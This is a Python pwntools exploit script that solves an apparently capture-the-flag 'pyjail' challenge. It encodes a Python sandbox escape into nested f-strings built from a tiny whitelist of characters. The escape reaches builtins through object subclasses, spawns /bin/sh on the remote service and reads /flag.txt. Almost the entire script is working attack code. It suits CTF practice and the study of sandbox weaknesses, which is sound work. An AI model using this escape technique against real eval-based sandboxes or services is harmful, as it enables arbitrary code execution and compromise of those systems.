#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337
from pwn import *
import re

# Set up pwntools for the correct architecture
# Just set TERM_PROGRAM in your ~/.profile!
# context.update(terminal='CHANGEME')
exe = (args.EXE or 'challenge')
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

# Find flag by exact match or format
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
fake_flag = open("./flag-fake.txt", "r").readline().strip()
def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match possible local flag
    with open("/flag.txt", "r") as local:
        locl_flag = local.readline().strip()
        if locl_flag in output:
            return locl_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None


# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")
def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def challenge(code):
    print("The Avatar is deeper in the ice this time...")
    #code = input("input: ").strip()
    whitelist = """abcdef"{>:}"""
    if any([x not in whitelist for x in code]):
        
        print("Denied!")
        exit(0)

    eval(eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})

    print("The slumber continues...")


ONE = """{"c">"a":d}"""
ZERO = """{"a">"c":d}"""

def getNumberKaboom(n):
    out = f"""f"{{f"{ZERO}b"""
    num = "".join([ZERO if x == "0" else ONE for x in f"{n:b}"])
    return out + num + """"}" """

def genCharacterKaboom(c, escapeFs=False):
    
    if c in """abcdef>""" and not escapeFs:
        return f'{c}'
    return "{{{" + getNumberKaboom(ord(c))[:-1] + '":c"}}}'

def genFStringKaboom(payload, escapeFs=False):
    out = 'f"'
    for x in payload:
        out += genCharacterKaboom(x, escapeFs)
    return out + '"'



def wrapFString(payload):
    return 'f"{"""f"{""}"""}"' + payload + 'f"""{""}"{""}"""'


payload = "[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if 'wrapper' not in f'{x.__init__}' and 'builtins' in x.__init__.__globals__ ][0]['builtins'].__import__('os').system('/bin/sh')"

x = genFStringKaboom(payload)
yeet = wrapFString(x)


log.debug(yeet)
io = connect(host, port, level="error")
log.info(f"{len(yeet) = }")
io.recvuntil(b"input: ")
io.sendline(yeet.encode("ascii"))
sleep(0.2) # sleep to wait for shell to pop
io.sendline(b"cat /flag.txt")
io.sendline(b"exit")

f = find_flag(io.recvall(timeout=5))
if f != None:
    log.success(f)
else:
    exit(1)
